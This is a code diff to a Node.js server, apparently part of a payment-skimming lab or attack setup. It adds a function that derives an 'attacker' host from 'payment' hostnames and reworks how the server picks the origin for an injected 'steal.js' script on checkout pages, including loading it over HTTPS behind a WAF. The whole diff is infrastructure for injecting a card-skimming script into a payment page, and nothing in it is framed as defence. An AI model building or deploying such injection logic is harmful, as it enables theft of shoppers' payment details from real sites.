@@ -14,6 +14,18 @@ function forwardedHost(req) {
   return raw.split(',')[0].trim();
 }
 
+/** payment / payment1 / payment2 → attacker / attacker1 / attacker2 (+ same suffix). */
+function deriveAttackerHost(paymentHost) {
+  if (!paymentHost) return '';
+  const host = paymentHost.split(',')[0].trim().split(':')[0];
+  const dot = host.indexOf('.');
+  const label = dot === -1 ? host : host.slice(0, dot);
+  const suffix = dot === -1 ? '' : host.slice(dot);
+  const match = label.match(/^payment(\d*)$/i);
+  if (!match) return '';
+  return `attacker${match[1]}${suffix}`;
+}
+
 /** Script URLs use //host — same scheme as the checkout page avoids mixed-content when TLS is fronted but Proxy-Proto is missing. */
 function absoluteToProtocolRelative(embed) {
   const t = embed.replace(/\/$/, '');
@@ -27,10 +39,9 @@ function absoluteToProtocolRelative(embed) {
 }
 
 /**
- * When PAYMENT_DOMAIN is payment.*, attacker host defaults to attacker.* ahead of ATTACKER_DOMAIN,
- * so a stale ATTACKER_DOMAIN or Host/WAF header does not skew the injected script.
+ * Derive steal.js host from request Host (payment / payment1 / payment2 …) when possible;
+ * fall back to PAYMENT_DOMAIN, then ATTACKER_DOMAIN.
  *
- * Prefer PAYMENT_DOMAIN / Host over ATTACKER_URL unless FORCE… .
  * Return protocol-relative "//hostname[:port]" for <script src> so HTTPS pages load steal.js over HTTPS even if Node saw http behind the WAF.
  */
 function resolveAttackerOrigin(req) {
@@ -47,15 +58,12 @@ function resolveAttackerOrigin(req) {
   let hostPart;
   if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') {
     hostPart = payHost;
-  } else if (cfgPay.startsWith('payment.')) {
-    // Prefer PAYMENT_DOMAIN so checkout matches the configured site even if Host/WAF sends a stale name.
-    hostPart = `attacker.${cfgPay.slice('payment.'.length)}`;
-  } else if (explicitAttack) {
-    hostPart = explicitAttack;
-  } else if (payHost.startsWith('payment.')) {
-    hostPart = `attacker.${payHost.slice('payment.'.length)}`;
   } else {
-    hostPart = payHost;
+    hostPart =
+      deriveAttackerHost(payHost) ||
+      deriveAttackerHost(cfgPay) ||
+      explicitAttack ||
+      payHost;
   }
 
   if (hostPart) {
